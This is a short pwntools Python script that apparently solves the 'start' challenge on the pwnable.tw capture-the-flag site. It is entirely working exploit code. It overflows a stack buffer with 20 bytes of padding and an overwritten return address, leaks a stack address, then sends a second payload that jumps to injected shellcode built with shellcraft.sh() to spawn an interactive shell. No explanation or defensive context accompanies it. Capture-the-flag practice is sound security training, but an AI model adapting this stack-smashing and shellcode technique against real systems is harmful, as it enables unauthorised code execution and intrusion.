from pwn import *

jump_address = p32(0x08048087)
mystr = b"a"*20 + jump_address

io = process("start")
# io = remote("chall.pwnable.tw", 10000)


# --- debugger
# pid = util.proc.pidof(io)[0]
# print("The pid is ", pid)
# util.proc.wait_for_debugger(pid)

io.send(mystr)
io.recv(20)
stack_address = io.recv(4)
io.recv(400)


shellcode_address = p32(u32(stack_address) + 0x14)
print("stack_address", hex(u32(stack_address)))
print("shellcode_address", hex(u32(shellcode_address)))

mystr2 = b"a"*20 + shellcode_address + asm(shellcraft.sh())
io.send(mystr2)

io.interactive()
